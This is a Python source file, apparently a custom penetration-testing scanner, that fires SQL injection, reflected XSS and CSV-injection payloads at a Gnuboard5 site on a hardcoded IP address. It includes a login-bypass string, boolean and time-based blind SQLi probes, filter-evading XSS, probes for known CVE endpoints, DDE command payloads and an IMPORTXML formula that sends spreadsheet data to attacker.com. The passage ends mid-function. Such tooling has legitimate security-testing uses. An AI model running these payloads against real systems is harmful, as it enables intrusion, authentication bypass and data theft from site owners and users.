"""
SQLi / XSS Scanner v4 - ZAP 방식 개선 적용
: Eyecatcher 컨텍스트 탐지 + Time-based double-check + Boolean 탐지 통합

Usage:
    python scanner.py
    python scanner.py --payloads payloads_v2.json --out scan_results_v3.json
    python scanner.py --point sqli_search_sfl --verbose
"""

import json
import time
import argparse
import sys
from typing import Dict, List, Optional, Tuple
from datetime import datetime

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from baseline import xss as bxss
from baseline import sqli as bsqli

# ── 설정 ──────────────────────────────────────────────────────────

TARGET_BASE = "http://34.68.27.120:8081"

SLEEP_THRESHOLD   = 4.5   # TIME_BASED 탐지 기준 (초) — ZAP: baseline + SLEEP_DURATION - 0.2
SLEEP_DURATION    = 5     # 주입하는 SLEEP() 초 단위
CTRL_DIFF_MINIMUM = 0.08  # Boolean 탐지 가능 판정 최소 차이 (8%)
BOOL_SIGNAL_MIN   = 0.05  # 페이로드 분류 최소 신호 강도

# MySQL 에러 패턴
MYSQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "xpath syntax error",
    "extractvalue(",
    "updatexml(",
    "duplicate entry",
    "column count doesn't match",
    "the used select statements have a different number",
    "supplied argument is not a valid mysql",
    "division by zero",
    "unknown column",
    "table 'g5_",          # Gnuboard5 테이블 노출
]

# XSS 탐지: 응답에 이 문자열이 HTML 인코딩 없이 나타나면 XSS
XSS_MARKERS = [
    "onerror=alert",
    "onload=alert",
    "onerror=eval",
    "ontoggle=alert",
    "onmouseover=alert",
    "onmouseover=\"alert",
    "onfocus=alert",
    "onstart=alert",
    "onanimationstart=alert",
    "src=x onerror",
    "<script>alert",
    "javascript:alert",
    "onerror=alert`",
    "href=javascript:",
    "<svg/onload",
    "<svg onload",
    "<details open ontoggle",
    # ZAP 방식 추가: 혼합 대소문자 우회 변형
    "onerror=prompt",
    "onerror=prompt()",
    # 백틱 함수 호출
    "onerror=alert`",
    "onmouseover=alert`",
]

# CSV Injection 탐지: 응답/Content-Type 기반
CSV_MARKERS = [
    "=cmd|",
    "=importxml",
    "=webservice",
    "=hyperlink",
    "=image(",
    "+cmd|",
    "@sum(",
    "=1+1",
]

CSV_CONTENT_TYPES = [
    "text/csv",
    "application/vnd.ms-excel",
    "application/vnd.openxmlformats",
    "application/octet-stream",
]

# ── Eyecatcher (ZAP 방식) ──────────────────────────────────────────
# 무해한 마커를 먼저 전송해서 반사 위치(컨텍스트) 파악
EYECATCHER = "zap7f3a9bmarker"

# ── targets.json 자동 로드용 기본 페이로드 ─────────────────────────
# crawler.py → analyzer.py → targets.json 연동 시 사용
GENERIC_SQLI_PAYLOADS = [
    {"type": "SQLI_STRING", "family": "quote_error",     "payload": "'1'='1"},
    {"type": "SQLI_STRING", "family": "quote_tautology", "payload": "' OR '1'='1"},
    {"type": "SQLI_STRING", "family": "error_extract",   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
    {"type": "SQLI_STRING", "family": "error_update",    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
    {"type": "SQLI_STRING", "family": "time_sleep",      "payload": "' AND SLEEP(5)-- -"},
    {"type": "SQLI_STRING", "family": "union_probe",     "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
]

GENERIC_XSS_PAYLOADS = [
    {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""},
    {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"},
    # ZAP 방식: 혼합 대소문자로 대소문자 필터 우회
    {"type": "REFLECTED_XSS", "family": "mixed_case",     "payload": "<scrIpt>alert(1)</scRipt>"},
    {"type": "REFLECTED_XSS", "family": "mixed_prompt",   "payload": "<img src=x onerror=prompt()>"},
    # 백틱 우회 (괄호 필터 우회)
    {"type": "REFLECTED_XSS", "family": "backtick",       "payload": "\"><img src=x onerror=alert`1`>"},
]

GENERIC_CSV_PAYLOADS = [
    {"type": "CSV_INJECTION", "family": "basic_formula",  "payload": "=1+1"},
    {"type": "CSV_INJECTION", "family": "dde_cmd",        "payload": "=cmd|'/C calc.exe'!A0"},
    {"type": "CSV_INJECTION", "family": "oob_importxml",  "payload": "=IMPORTXML(CONCAT(\"http://attacker.com/?leak=\",A1),\"//a\")"},
    {"type": "CSV_INJECTION", "family": "hyperlink",      "payload": "=HYPERLINK(\"http://attacker.com\",\"Click\")"},
    {"type": "CSV_INJECTION", "family": "plus_cmd",       "payload": "+cmd|'/C whoami'!A0"},
]

# 컨텍스트별 우선 시도 페이로드 힌트 (참고용 로그)
XSS_CONTEXT_HINT = {
    "attr_value":  '→ " onmouseover=alert(1) x=" 계열 우선',
    "attr_href":   '→ javascript:alert(1) 계열 우선',
    "script":      '→ ";alert(1);// 계열 우선',
    "body":        '→ <img src=x onerror=alert(1)> 계열 우선',
    "html_comment":'→ --> <script>alert(1)</script> <!-- 계열 우선',
    "none":        '→ 반사 없음 (필터링됨)',
    "unknown":     '→ 컨텍스트 불명확',
}

# ZAP 방식: 컨텍스트별 특화 페이로드 (eyecatcher 결과에 따라 자동 선택)
XSS_CONTEXT_PAYLOADS = {
    "attr_value": [
        {"type": "REFLECTED_XSS", "family": "ctx_attr_onclick",    "payload": "accesskey='x' onclick='alert(1)' b"},
        {"type": "REFLECTED_XSS", "family": "ctx_attr_onmouseover","payload": "\" onmouseover=alert(1) x=\""},
        {"type": "REFLECTED_XSS", "family": "ctx_attr_onfocus",    "payload": "\" autofocus onfocus=alert(1) x=\""},
        {"type": "REFLECTED_XSS", "family": "ctx_attr_onpointer",  "payload": "\" onpointerover=alert(1) x=\""},
        {"type": "REFLECTED_XSS", "family": "ctx_attr_backtick",   "payload": "\" onmouseover=alert`1` x=\""},
        {"type": "REFLECTED_XSS", "family": "ctx_attr_entity",     "payload": "\" onmouseover&#61;alert(1) x=\""},
    ],
    "script": [
        {"type": "REFLECTED_XSS", "family": "ctx_script_dq",       "payload": "\";alert(1);//"},
        {"type": "REFLECTED_XSS", "family": "ctx_script_sq",       "payload": "';alert(1);//"},
        {"type": "REFLECTED_XSS", "family": "ctx_script_break",    "payload": "</script><script>alert(1)</script>"},
        {"type": "REFLECTED_XSS", "family": "ctx_script_template", "payload": "`${alert(1)}`"},
    ],
    "html_comment": [
        {"type": "REFLECTED_XSS", "family": "ctx_comment_break",   "payload": "--><script>alert(1)</script><!--"},
        {"type": "REFLECTED_XSS", "family": "ctx_comment_img",     "payload": "--><img src=x onerror=alert(1)><!--"},
    ],
    "attr_href": [
        {"type": "REFLECTED_XSS", "family": "ctx_href_js",         "payload": "javascript:alert(1);"},
        {"type": "REFLECTED_XSS", "family": "ctx_href_prompt",     "payload": "javascript:prompt(1)"},
        {"type": "REFLECTED_XSS", "family": "ctx_href_data",       "payload": "data:text/html,<script>alert(1)</script>"},
    ],
    "body": [
        {"type": "REFLECTED_XSS", "family": "ctx_body_mixed",      "payload": "<scrIpt>alert(1);</scRipt>"},
        {"type": "REFLECTED_XSS", "family": "ctx_body_img",        "payload": "<img src=x onerror=prompt()>"},
        {"type": "REFLECTED_XSS", "family": "ctx_body_svg",        "payload": "<svg onload=alert(1)>"},
        {"type": "REFLECTED_XSS", "family": "ctx_body_null",       "payload": "\0<scrIpt>alert(1);</scRipt>"},
        {"type": "REFLECTED_XSS", "family": "ctx_body_details",    "payload": "<details open ontoggle=alert(1)>"},
    ],
}

# ── ZAP 방식 Blind SQLi 기본 페이로드 (포인트별 자동 주입) ────────────
# 참고: ZAP SqlInjectionScanRule — TRUE/FALSE 조건 비교
#        ZAP SqlInjectionMySqlScanRule — baseline + SLEEP 방식
#
# 각 포인트의 ctrl_true/ctrl_false와 같은 따옴표 스타일을 사용.
# 탐지 흐름: measure_controls → boolean_possible → boolean_TRUE_condition
#            measure_baseline → inject SLEEP → elapsed >= baseline + SLEEP - 0.2

BLIND_SQLI_PAYLOADS: dict = {

    # ══ ZAP 탐지: qalist.php stx (싱글쿼트 컨텍스트) ════════════
    # ctrl_true:  "test' AND '1'='1' -- "
    # ctrl_false: "test' AND '1'='2' -- "
    "sqli_qalist_blind": [
        # Boolean — ZAP AND TRUE/FALSE
        {"type": "BOOLEAN", "family": "zap_and_true",
         "payload": "test' AND '1'='1' -- "},
        {"type": "BOOLEAN", "family": "zap_and_false",
         "payload": "test' AND '1'='2' -- "},
        # Boolean — 서브쿼리 (DB 접근 가능 여부)
        {"type": "BOOLEAN", "family": "subq_tables",
         "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
        {"type": "BOOLEAN", "family": "subq_db_len",
         "payload": "test' AND LENGTH(database())>0 -- "},
        {"type": "BOOLEAN", "family": "subq_db_char",
         "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
        # Time-based — ZAP MySQL: ORIG AND 0 IN (SELECT SLEEP(N))
        {"type": "TIME_BASED", "family": "zap_and_sleep",
         "payload": "test' AND 0 IN (SELECT SLEEP(5)) -- "},
        {"type": "TIME_BASED", "family": "zap_if_sleep",
         "payload": "test' AND IF(1=1,SLEEP(5),0) -- "},
    ],

    # ══ board.php wr_id (정수형 컨텍스트) ═══════════════════════
    # WHERE wr_id = INJECT → 따옴표 없이 직접 삽입
    # ctrl_true:  "1 AND 1=1-- -"
    # ctrl_false: "1 AND 1=2-- -"
    "sqli_board_wr_id": [
        {"type": "BOOLEAN", "family": "int_and_true",
         "payload": "1 AND 1=1-- -"},
        {"type": "BOOLEAN", "family": "int_and_false",
         "payload": "1 AND 1=2-- -"},
        {"type": "BOOLEAN", "family": "subq_tables",
         "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
        {"type": "BOOLEAN", "family": "subq_db_len",
         "payload": "1 AND LENGTH(database())>0-- -"},
        {"type": "BOOLEAN", "family": "subq_db_char",
         "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
        {"type": "TIME_BASED", "family": "int_sleep",
         "payload": "1 AND 0 IN (SELECT SLEEP(5))-- -"},
        {"type": "TIME_BASED", "family": "int_if_sleep",
         "payload": "1 AND IF(1=1,SLEEP(5),0)-- -"},
    ],

    # ══ ZAP 탐지: password.php sod (더블쿼트, desc 값) ══════════
    # ctrl_true:  'desc" AND "1"="1" -- '
    # ctrl_false: 'desc" AND "1"="2" -- '
    "sqli_password_sod": [
        {"type": "BOOLEAN", "family": "zap_and_true",
         "payload": 'desc" AND "1"="1" -- '},
        {"type": "BOOLEAN", "family": "zap_and_false",
         "payload": 'desc" AND "1"="2" -- '},
        {"type": "BOOLEAN", "family": "subq_tables",
         "payload": 'desc" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
        {"type": "TIME_BASED", "family": "zap_and_sleep",
         "payload": 'desc" AND 0 IN (SELECT SLEEP(5)) -- '},
        {"type": "TIME_BASED", "family": "zap_if_sleep",
         "payload": 'desc" AND IF(1=1,SLEEP(5),0) -- '},
    ],

    # ══ ZAP 탐지: password.php sop (더블쿼트, and 값) ═══════════
    # ctrl_true:  'and" AND "1"="1" -- '
    # ctrl_false: 'and" AND "1"="2" -- '
    "sqli_password_sop": [
        {"type": "BOOLEAN", "family": "zap_and_true",
         "payload": 'and" AND "1"="1" -- '},
        {"type": "BOOLEAN", "family": "zap_and_false",
         "payload": 'and" AND "1"="2" -- '},
        {"type": "BOOLEAN", "family": "subq_tables",
         "payload": 'and" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
        {"type": "TIME_BASED", "family": "zap_and_sleep",
         "payload": 'and" AND 0 IN (SELECT SLEEP(5)) -- '},
        {"type": "TIME_BASED", "family": "zap_if_sleep",
         "payload": 'and" AND IF(1=1,SLEEP(5),0) -- '},
    ],

    # ══ search.php stx — 괄호 닫기 방식 Boolean + Time ═══════════
    # SQL 구조: WHERE (wr_subject LIKE '%INJECT%')
    # → %' AND 1=1)-- - 로 괄호 닫아서 탈출
    # ctrl_true:  "%' AND 1=1)-- -"  → 모든 게시글 반환
    # ctrl_false: "%' AND 1=2)-- -"  → 빈 결과
    "sqli_search_stx": [
        # Boolean — 괄호 닫기
        {"type": "BOOLEAN", "family": "paren_true",
         "payload": "%' AND 1=1)-- -"},
        {"type": "BOOLEAN", "family": "paren_false",
         "payload": "%' AND 1=2)-- -"},
        {"type": "BOOLEAN", "family": "paren_subq_tables",
         "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
        {"type": "BOOLEAN", "family": "paren_db_len",
         "payload": "%' AND LENGTH(database())>0)-- -"},
        {"type": "BOOLEAN", "family": "paren_db_char",
         "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
        # Time-based — 괄호 닫기 + SLEEP
        {"type": "TIME_BASED", "family": "paren_sleep",
         "payload": "%') AND SLEEP(5)-- -"},
        {"type": "TIME_BASED", "family": "paren_if_sleep",
         "payload": "%' AND IF(1=1,SLEEP(5),0))-- -"},
        # ZAP MySQL 방식 (기존 유지)
        {"type": "TIME_BASED", "family": "zap_and_sleep",
         "payload": "%' AND 0 IN (SELECT SLEEP(5)) -- -"},
        {"type": "TIME_BASED", "family": "zap_if_sleep",
         "payload": "%' AND IF(1=1,SLEEP(5),0) -- -"},
    ],
}

# ── 포인트별 설정 ─────────────────────────────────────────────────

POINT_CONFIG = {

    # ══ Reflected XSS ════════════════════════════════════════════

    "xss_search_stx": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {"sfl": "wr_subject", "sop": "and"},
        # XSS 모드에서는 ctrl 불필요하지만 형식 맞춤
        "ctrl_true":  "xss_check_marker_12345",
        "ctrl_false": "normal_search_test",
        "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
    },
    "xss_qalist_stx": {
        "url":    f"{TARGET_BASE}/bbs/qalist.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {"sfl": "wr_subject"},
        "ctrl_true":  "xss_check_marker_12345",
        "ctrl_false": "normal_search_test",
        "ctrl_extra": {"sfl": "wr_subject"},
    },

    # ══ SQLi: 필드 선택자 (sfl) ═══════════════════════════════════

    "sqli_search_sfl": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "sfl",
        "mode":   "sqli",
        "inject_extra": {"stx": "test", "sop": "and"},
        # sfl=wr_subject (정상) vs wr_content (다른 필드)
        # 차이가 없으면 boolean 불가 → error/time 탐지로 전환
        "ctrl_true":  "wr_subject",
        "ctrl_false": "wr_content",
        "ctrl_extra": {"stx": "test", "sop": "and"},
    },
    "sqli_qalist_sfl": {
        "url":    f"{TARGET_BASE}/bbs/qalist.php",
        "method": "GET",
        "param":  "sfl",
        "mode":   "sqli",
        "inject_extra": {"stx": "test"},
        "ctrl_true":  "wr_subject",
        "ctrl_false": "wr_content",
        "ctrl_extra": {"stx": "test"},
    },

    # ══ SQLi: ORDER BY 컬럼 (sst) ═════════════════════════════════

    "sqli_search_sst": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "sst",
        "mode":   "sqli",
        "inject_extra": {"stx": "", "sfl": "wr_subject", "sop": "and"},
        "ctrl_true":  "wr_datetime",   # 정렬 기준 A
        "ctrl_false": "wr_hit",        # 정렬 기준 B (내용 동일, 순서 다를 수 있음)
        "ctrl_extra": {"stx": "", "sfl": "wr_subject", "sop": "and"},
    },

    # ══ SQLi: 검색 키워드 문자열 컨텍스트 (stx) ═══════════════════

    "sqli_search_stx": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"sfl": "wr_subject", "sop": "and"},
        # SQL 구조: WHERE (wr_subject LIKE '%INJECT%')
        # → 괄호 닫기: %' AND 1=1)-- - 로 탈출
        # TRUE: LIKE '%%' AND 1=1) → 모든 게시글
        # FALSE: LIKE '%%' AND 1=2) → 빈 결과
        "ctrl_true":  "%' AND 1=1)-- -",
        "ctrl_false": "%' AND 1=2)-- -",
        "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
    },

    # ══ SQLi: 로그인 폼 (mb_id) ═══════════════════════════════════

    "sqli_login_mb_id": {
        "url":    f"{TARGET_BASE}/bbs/login_check.php",
        "method": "POST",
        "param":  "mb_id",
        "mode":   "sqli_login",
        "inject_extra": {"mb_password": "wrongpassword_xyz", "url": "/"},
        # SQLi 성공 시 로그인 됨 (응답 크기 차이 발생)
        "ctrl_true":  "admin' OR '1'='1'-- -",   # bypass 시도
        "ctrl_false": "definitely_no_such_user_xyz789",  # 실패 확실
        "ctrl_extra": {"mb_password": "wrongpassword_xyz", "url": "/"},
    },

    # ══ CVE-2020-18662: install/install_db.php table_prefix SQLi ═
    # PoC: table_prefix = "12'; select sleep(5)#"
    "cve_18662_install_sqli": {
        "url":    f"{TARGET_BASE}/install/install_db.php",
        "method": "POST",
        "param":  "table_prefix",
        "mode":   "sqli",
        "inject_extra": {
            "db_host":        "localhost",
            "db_user":        "root",
            "db_password":    "",
            "db_name":        "gnuboard",
            "db_port":        "3306",
            "admin_id":       "admin",
            "admin_password": "admin",
            "admin_email":    "admin@test.com",
        },
        "ctrl_true":  "g5_",    # 정상 prefix
        "ctrl_false": "zz_",    # 다른 정상 prefix
        "ctrl_extra": {
            "db_host":        "localhost",
            "db_user":        "root",
            "db_password":    "",
            "db_name":        "gnuboard",
            "db_port":        "3306",
            "admin_id":       "admin",
            "admin_password": "admin",
            "admin_email":    "admin@test.com",
        },
    },

    # ══ CVE-2020-18661: bbs/login.php url 파라미터 Reflected XSS ══
    "cve_18661_login_xss": {
        "url":    f"{TARGET_BASE}/bbs/login.php",
        "method": "GET",
        "param":  "url",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ CVE-2020-18663: bbs/move_update.php XSS (bo_table) ═══════
    "cve_18663_move_xss": {
        "url":    f"{TARGET_BASE}/bbs/move_update.php",
        "method": "POST",
        "param":  "bo_table",
        "mode":   "xss",
        "inject_extra": {"wr_id": "1", "sw": "move"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ search.php stx — 단순 quote 방식 재테스트 ════════════════
    "sqli_search_stx_fix": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"sfl": "wr_subject", "sop": "and"},
        "ctrl_true":  "' OR '1'='1",
        "ctrl_false": "'zzz_no_match'",
        "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
    },

    # ══ faq.php stx — SQLi ════════════════════════════════════════
    "sqli_faq_stx": {
        "url":    f"{TARGET_BASE}/bbs/faq.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {},
        "ctrl_true":  "' OR '1'='1",
        "ctrl_false": "'zzz_no_match'",
        "ctrl_extra": {},
    },

    # ══ faq.php stx — XSS ════════════════════════════════════════
    "xss_faq_stx": {
        "url":    f"{TARGET_BASE}/bbs/faq.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ write_update.php — Stored XSS 우회 (로그인 필요 → 수동) ══
    # 아래 2개는 PAYLOAD_TO_POINT에서 None 처리 (수동 테스트 안내용)

    # ══ 게시판 (board.php) — XSS ══════════════════════════════════
    "xss_board_stx": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {"bo_table": "free", "sfl": "wr_subject"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 게시판 (board.php) — SQLi stx ════════════════════════════
    "sqli_board_stx": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "free", "sfl": "wr_subject"},
        "ctrl_true":  "aaaa OR 1=1-- -",
        "ctrl_false": "aaaa OR 1=2-- -",
        "ctrl_extra": {"bo_table": "free", "sfl": "wr_subject"},
    },

    # ══ 게시판 (board.php) — SQLi sfl ════════════════════════════
    "sqli_board_sfl": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "sfl",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "free", "stx": "test"},
        "ctrl_true":  "wr_subject",
        "ctrl_false": "wr_content",
        "ctrl_extra": {"bo_table": "free", "stx": "test"},
    },

    # ══ 게시판 (board.php) — SQLi sst ════════════════════════════
    "sqli_board_sst": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "sst",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "free", "stx": "", "sfl": "wr_subject"},
        "ctrl_true":  "wr_datetime",
        "ctrl_false": "wr_hit",
        "ctrl_extra": {"bo_table": "free", "stx": "", "sfl": "wr_subject"},
    },

    # ══ Ajax 회원 확인 — SQLi mb_id ══════════════════════════════
    "sqli_ajax_member": {
        "url":    f"{TARGET_BASE}/bbs/ajax.member_check.php",
        "method": "POST",
        "param":  "mb_id",
        "mode":   "sqli",
        "inject_extra": {},
        "ctrl_true":  "admin",
        "ctrl_false": "zzznonexistent_xyz",
        "ctrl_extra": {},
    },

    # ══ move_update.php — from_bo_table XSS (CVE-2020-18663 retry)
    "xss_move_from_bo": {
        "url":    f"{TARGET_BASE}/bbs/move_update.php",
        "method": "POST",
        "param":  "from_bo_table",
        "mode":   "xss",
        "inject_extra": {"wr_id": "1", "sw": "move", "bo_table": "free"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ move_update.php — wr_id XSS ══════════════════════════════
    "xss_move_wr_id": {
        "url":    f"{TARGET_BASE}/bbs/move_update.php",
        "method": "GET",
        "param":  "wr_id",
        "mode":   "xss",
        "inject_extra": {"bo_table": "free", "sw": "move"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 비밀번호 페이지 — url XSS ════════════════════════════════
    "xss_password_url": {
        "url":    f"{TARGET_BASE}/bbs/password.php",
        "method": "GET",
        "param":  "url",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 프로필 페이지 — mb_id XSS ════════════════════════════════
    "xss_profile_mb": {
        "url":    f"{TARGET_BASE}/bbs/profile.php",
        "method": "GET",
        "param":  "mb_id",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 프로필 페이지 — mb_id SQLi ═══════════════════════════════
    "sqli_profile_mb": {
        "url":    f"{TARGET_BASE}/bbs/profile.php",
        "method": "GET",
        "param":  "mb_id",
        "mode":   "sqli",
        "inject_extra": {},
        "ctrl_true":  "admin",
        "ctrl_false": "zzznonexistent_xyz",
        "ctrl_extra": {},
    },

    # ══ 회원가입 폼 — mb_nick XSS ════════════════════════════════
    "xss_register_name": {
        "url":    f"{TARGET_BASE}/bbs/register_form.php",
        "method": "GET",
        "param":  "mb_nick",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 로그인 url — Open Redirect ════════════════════════════════
    "open_redirect_login": {
        "url":    f"{TARGET_BASE}/bbs/login.php",
        "method": "GET",
        "param":  "url",
        "mode":   "xss",   # 반영 여부로 확인
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ ZAP 발견: password.php — sod Boolean Blind SQLi ══════════
    # ZAP 탐지 payload: desc" AND "1"="1" --  vs  desc" AND "1"="2" --
    "sqli_password_sod": {
        "url":    f"{TARGET_BASE}/bbs/password.php",
        "method": "GET",
        "param":  "sod",
        "mode":   "sqli",
        "inject_extra": {
            "bo_table": "test", "page": "1",
            "sop": "and", "sst": "wr_hit", "w": "u", "wr_id": "3",
        },
        # TRUE(1=1) vs FALSE(1=2) → 응답 크기 차이로 Boolean Blind 탐지
        "ctrl_true":  'desc" AND "1"="1" -- ',
        "ctrl_false": 'desc" AND "1"="2" -- ',
        "ctrl_extra": {
            "bo_table": "test", "page": "1",
            "sop": "and", "sst": "wr_hit", "w": "u", "wr_id": "3",
        },
    },

    # ══ ZAP 발견: password.php — sop Boolean Blind SQLi ══════════
    "sqli_password_sop": {
        "url":    f"{TARGET_BASE}/bbs/password.php",
        "method": "GET",
        "param":  "sop",
        "mode":   "sqli",
        "inject_extra": {
            "bo_table": "test", "page": "1",
            "sod": "desc", "sst": "wr_hit", "w": "u", "wr_id": "3",
        },
        "ctrl_true":  'and" AND "1"="1" -- ',
        "ctrl_false": 'and" AND "1"="2" -- ',
        "ctrl_extra": {
            "bo_table": "test", "page": "1",
            "sod": "desc", "sst": "wr_hit", "w": "u", "wr_id": "3",
        },
    },

    # ══ ZAP 발견: board.php — wr_id Boolean Blind SQLi ══════════
    # wr_id는 정수형 컨텍스트: WHERE wr_id = INJECT (따옴표 없음)
    # ZAP 방식: 1 AND 1=1-- - (TRUE) vs 1 AND 1=2-- - (FALSE)
    "sqli_board_wr_id": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "wr_id",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "gallery"},
        "ctrl_true":  "1 AND 1=1-- -",
        "ctrl_false": "1 AND 1=2-- -",
        "ctrl_extra": {"bo_table": "gallery"},
    },

    # ══ ZAP 발견: qalist.php — Boolean Blind SQLi (URL 파라미터) ═
    "sqli_qalist_blind": {
        "url":    f"{TARGET_BASE}/bbs/qalist.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"sfl": "wr_subject"},
        # ZAP: ' AND '1'='1' --  vs  ' AND '1'='2' --
        "ctrl_true":  "test' AND '1'='1' -- ",
        "ctrl_false": "test' AND '1'='2' -- ",
        "ctrl_extra": {"sfl": "wr_subject"},
    },
}


# ── Baseline 페이로드 매핑 ────────────────────────────────────────
# POINT_CONFIG 키 → baseline 컨텍스트 기반 페이로드
# _baseline_payloads()는 main()에서 --baseline 플래그 시 호출

def _baseline_payloads(strength: str = "HIGH") -> Dict:
    """각 POINT_CONFIG 포인트에 맞는 baseline 페이로드 딕셔너리 반환."""
    s = strength
    return {
        # ── XSS: stx 검색 (= · () 이중 필터 우회) ──
        "xss_search_stx":         {"stx_filtered":    bxss.get_by_context("stx_filtered",       s)},
        "xss_qalist_stx":         {"stx_filtered":    bxss.get_by_context("stx_filtered",       s)},
        "xss_faq_stx":            {"stx_filtered":    bxss.get_by_context("stx_filtered",       s)},
        "xss_board_stx":          {"stx_filtered":    bxss.get_by_context("stx_filtered",       s)},
        # ── XSS: url href 컨텍스트 (Open Redirect / Reflected) ──
        "cve_18661_login_xss":    {"url_redirect":    bxss.get_by_context("url_redirect",       s)},
        "xss_password_url":       {"url_redirect":    bxss.get_by_context("url_redirect",       s)},
        "open_redirect_login":    {"url_redirect":    bxss.get_by_context("url_redirect",       s)},
        # ── XSS: body / attr_value 컨텍스트 ──
        "cve_18663_move_xss":     {"body":            bxss.get_by_context("body",               s)},
        "xss_move_from_bo":       {"body":            bxss.get_by_context("body",               s)},
        "xss_move_wr_id":         {"body":            bxss.get_by_context("body",               s)},
        "xss_profile_mb":         {"attr_value":      bxss.get_by_context("attr_value",         s)},
        "xss_register_name":      {"attr_value":      bxss.get_by_context("attr_value",         s)},
        # ── SQLi: field_selector (sfl — WHERE 컬럼명 직접 치환) ──
        "sqli_search_sfl":        {"field_selector":  bsqli.get_by_sql_context("field_selector", s)},
        "sqli_qalist_sfl":        {"field_selector":  bsqli.get_by_sql_context("field_selector", s)},
        "sqli_board_sfl":         {"field_selector":  bsqli.get_by_sql_context("field_selector", s)},
        # ── SQLi: orderby (sst — ORDER BY 컬럼명 직접 치환) ──
        "sqli_search_sst":        {"orderby":         bsqli.get_by_sql_context("orderby",        s)},
        "sqli_board_sst":         {"orderby":         bsqli.get_by_sql_context("orderby",        s)},
        # ── SQLi: like_string (stx, sod, sop, wr_id — 문자열 컨텍스트) ──
        "sqli_search_stx":        {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_search_stx_fix":    {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_qalist_blind":      {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_faq_stx":           {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_board_stx":         {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_password_sod":      {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_password_sop":      {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_board_wr_id":       {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        "sqli_profile_mb":        {"like_string":     bsqli.get_by_sql_context("like_string",    s)},
        # ── SQLi: auth (mb_id — 인증 우회) ──
        "sqli_login_mb_id":       {"auth":            bsqli.get_by_sql_context("auth",           s)},
        "sqli_ajax_member":       {"auth":            bsqli.get_by_sql_context("auth",           s)},
        # ── SQLi: CVE-2020-18662 (table_prefix) ──
        "cve_18662_install_sqli": {"cve_prefix":      bsqli.get_by_sql_context("cve_prefix",     s)},
